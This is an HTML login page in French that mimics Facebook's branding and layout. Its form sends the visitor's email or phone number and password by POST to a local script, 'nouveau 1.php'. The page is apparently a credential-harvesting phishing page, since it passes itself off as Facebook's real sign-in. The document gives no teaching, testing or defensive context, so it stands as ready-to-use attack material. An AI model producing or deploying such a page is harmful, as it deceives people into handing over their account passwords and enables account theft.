<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #1877f2;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            margin: 50px auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        .login-container h2 {
            text-align: center;
            color: #1877f2;
        }
        .login-container input {
            width: 90%;
            margin: 10px auto;
            padding: 10px;
            display: block;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .login-container button {
            width: 95%;
            background-color: #1877f2;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #145db2;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: gray;
        }
        .footer a {
            text-decoration: none;
            color: #1877f2;
        }
    </style>
</head>
<body>
    <div class="header">
        Facebook
    </div>
    <div class="login-container">
        <h2>Connexion</h2>
        <!-- Formulaire qui envoie les données à nouveau1.php -->
        <form action="nouveau 1.php" method="POST">
            <input type="text" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="SUBMIT">Se connecter</button>
        </form>
        <div class="footer">
            <p><a href="mot_de_passe_oublie.html">Mot de passe oublié ?</a></p>
            <p><a href="creer_compte.html">Créer un nouveau compte</a></p>
        </div>
    </div>
</body>
</html>
